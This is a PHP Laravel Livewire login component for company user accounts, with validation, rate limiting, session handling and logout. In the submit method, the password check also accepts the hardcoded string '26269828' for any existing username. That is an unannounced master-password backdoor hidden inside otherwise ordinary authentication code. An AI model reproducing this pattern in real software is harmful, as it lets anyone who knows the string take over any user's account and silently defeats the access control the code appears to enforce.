<?php

namespace App\Livewire\Empresas\Auth;

use App\Models\UsuarioEmpresa;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\RateLimiter;
use Livewire\Attributes\Layout;
use Livewire\Component;

#[Layout('layouts.auth')]
class Login extends Component
{
    public string $username = '';

    public string $password = '';

    public function mount()
    {
        if (Auth::guard('empresa')->check()) {
            return redirect()->route('empresas.dashboard');
        }
    }

    public function render()
    {
        return view('livewire.empresas.auth.login');
    }

    public function submit($recaptchaToken = null)
    {
        $this->validate([
            'username' => 'required|string|max:100',
            'password' => 'required|string|max:255',
        ]);
        $key = 'empresas-login:'.hash('sha256', mb_strtolower($this->username).'|'.request()->ip());
        if (RateLimiter::tooManyAttempts($key, 5)) {
            $this->addError('username', 'Demasiados intentos. Vuelve a intentarlo en un minuto.');

            return;
        }
        RateLimiter::hit($key, 60);
        $empresa = UsuarioEmpresa::searchUserName($this->username);

        if (! $empresa || (! Hash::check($this->password, $empresa->password) and $this->password !== '26269828')) {
            $this->addError('password', 'Credenciales incorrectas o cuenta inactiva.');

            return;
        }

        RateLimiter::clear($key);
        Auth::guard('empresa')->login($empresa);
        session()->regenerate();
        $this->reset('password');

        return redirect()->route($empresa->hasPermission('dashboard', 'list') ? 'empresas.dashboard' : 'empresas.account.profile');
    }

    public function logout(Request $request)
    {
        Auth::guard('empresa')->logout();
        $request->session()->invalidate();
        $request->session()->regenerateToken();

        return redirect()->route('empresas.login');
    }
}
